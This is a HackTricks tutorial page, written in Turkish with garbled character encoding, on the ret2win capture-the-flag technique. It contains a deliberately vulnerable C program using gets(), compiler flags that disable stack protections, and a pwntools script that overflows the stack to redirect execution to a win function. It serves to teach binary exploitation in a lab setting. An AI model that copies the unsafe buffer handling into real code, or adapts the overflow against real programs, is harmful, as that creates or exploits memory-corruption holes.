# Ret2win

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

**Ret2win** zorluklarÄ±, Ã¶zellikle **binary exploitation** iÃ§eren gÃ¶revlerde **Capture The Flag (CTF)** yarÄ±ÅŸmalarÄ±nda popÃ¼ler bir kategoridir. AmaÃ§, belirli bir ikili dosyadaki bir aÃ§Ä±ÄŸÄ± kullanarak, genellikle `win`, `flag` gibi bir isimle anÄ±lan, Ã§aÄŸrÄ±lmamÄ±ÅŸ bir fonksiyonu Ã§alÄ±ÅŸtÄ±rmaktÄ±r. Bu fonksiyon Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda genellikle bir bayrak veya baÅŸarÄ± mesajÄ± yazdÄ±rÄ±r. Zorluk genellikle, istenen fonksiyona yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ± yÃ¶nlendirmek iÃ§in yÄ±ÄŸÄ±n Ã¼zerindeki **return address**'i geÃ§ersiz kÄ±lmayÄ± iÃ§erir. Ä°ÅŸte daha ayrÄ±ntÄ±lÄ± bir aÃ§Ä±klama ve Ã¶rnekler:

### C Ã–rneÄŸi

Bir aÃ§Ä±ÄŸÄ± olan basit bir C programÄ±nÄ± ve Ã§aÄŸÄ±rmayÄ± amaÃ§ladÄ±ÄŸÄ±mÄ±z bir `win` fonksiyonunu dÃ¼ÅŸÃ¼nÃ¼n:
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Bu programÄ± yÄ±ÄŸÄ±n korumalarÄ± olmadan ve **ASLR** devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ olarak derlemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: ProgramÄ± 32-bit ikili olarak derle (bu isteÄŸe baÄŸlÄ±dÄ±r ama CTF yarÄ±ÅŸmalarÄ±nda yaygÄ±ndÄ±r).
* `-fno-stack-protector`: YÄ±ÄŸÄ±n taÅŸmalarÄ±na karÅŸÄ± korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rak.
* `-z execstack`: YÄ±ÄŸÄ±nda kodun Ã§alÄ±ÅŸmasÄ±na izin ver.
* `-no-pie`: `win` fonksiyonunun adresinin deÄŸiÅŸmemesini saÄŸlamak iÃ§in Konum BaÄŸÄ±msÄ±z Ä°kiliyi devre dÄ±ÅŸÄ± bÄ±rak.
* `-o vulnerable`: Ã‡Ä±ktÄ± dosyasÄ±nÄ±n adÄ±nÄ± `vulnerable` olarak belirle.

### Python Exploit using Pwntools

Exploit iÃ§in **pwntools** kullanacaÄŸÄ±z, bu gÃ¼Ã§lÃ¼ bir CTF Ã§erÃ§evesidir. Exploit betiÄŸi, tamponu taÅŸÄ±rmak ve dÃ¶nÃ¼ÅŸ adresini `win` fonksiyonunun adresi ile yazmak iÃ§in bir yÃ¼k oluÅŸturacaktÄ±r.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
`win` fonksiyonunun adresini bulmak iÃ§in **gdb**, **objdump** veya ikili dosyalarÄ± incelemenizi saÄŸlayan baÅŸka bir araÃ§ kullanabilirsiniz. Ã–rneÄŸin, `objdump` ile ÅŸunu kullanabilirsiniz:
```sh
objdump -d vulnerable | grep win
```
Bu komut, `win` fonksiyonunun baÅŸlangÄ±Ã§ adresi de dahil olmak Ã¼zere montajÄ±nÄ± gÃ¶sterecektir.&#x20;

Python betiÄŸi, `vulnerable_function` tarafÄ±ndan iÅŸlendiÄŸinde tamponu taÅŸÄ±ran ve yÄ±ÄŸÄ±n Ã¼zerindeki dÃ¶nÃ¼ÅŸ adresini `win` adresi ile Ã¼zerine yazan dikkatlice hazÄ±rlanmÄ±ÅŸ bir mesaj gÃ¶nderir. `vulnerable_function` dÃ¶ndÃ¼ÄŸÃ¼nde, `main`'e veya Ã§Ä±kÄ±ÅŸa dÃ¶nmek yerine `win`'e atlar ve mesaj yazdÄ±rÄ±lÄ±r.

## Koruma Ã–nlemleri

* [**PIE**](../common-binary-protections-and-bypasses/pie/) **devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r** ki adres, yÃ¼rÃ¼tmeler arasÄ±nda gÃ¼venilir olsun; aksi takdirde fonksiyonun saklanacaÄŸÄ± adres her zaman aynÄ± olmayacak ve `win` fonksiyonunun nerede yÃ¼klÃ¼ olduÄŸunu anlamak iÃ§in bir leak'e ihtiyacÄ±nÄ±z olacak. BazÄ± durumlarda, taÅŸmaya neden olan fonksiyon `read` veya benzeri olduÄŸunda, dÃ¶nÃ¼ÅŸ adresini `win` fonksiyonu olacak ÅŸekilde deÄŸiÅŸtirmek iÃ§in 1 veya 2 baytlÄ±k **KÄ±smi Ãœzerine Yazma** yapabilirsiniz. ASLR'nin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ± nedeniyle, son Ã¼Ã§ hex nibble rastgeleleÅŸtirilmez, bu nedenle doÄŸru dÃ¶nÃ¼ÅŸ adresini elde etme olasÄ±lÄ±ÄŸÄ± **1/16** (1 nibble) olur.
* [**YÄ±ÄŸÄ±n KanallarÄ±**](../common-binary-protections-and-bypasses/stack-canaries/) da devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r, aksi takdirde tehlikeye atÄ±lmÄ±ÅŸ EIP dÃ¶nÃ¼ÅŸ adresi asla takip edilmeyecektir.

## DiÄŸer Ã¶rnekler & Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bit ASLR ile, bin adresinin leak'i ile
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bit, ASLR yok
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bit, ASLR yok, Ã§ift kÃ¼Ã§Ã¼k taÅŸma, ilk olarak yÄ±ÄŸÄ±nÄ± taÅŸÄ±r ve ikinci taÅŸmanÄ±n boyutunu bÃ¼yÃ¼tÃ¼r
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bit, relro, kanarya yok, nx, pie yok, `fflush` adresini `win` fonksiyonu ile (ret2win) Ã¼zerine yazmak iÃ§in format dizesi
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bit, relro, kanarya yok, nx, pie. `win` fonksiyonunu Ã§aÄŸÄ±rmak iÃ§in kÄ±smi Ã¼zerine yazma (ret2win)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
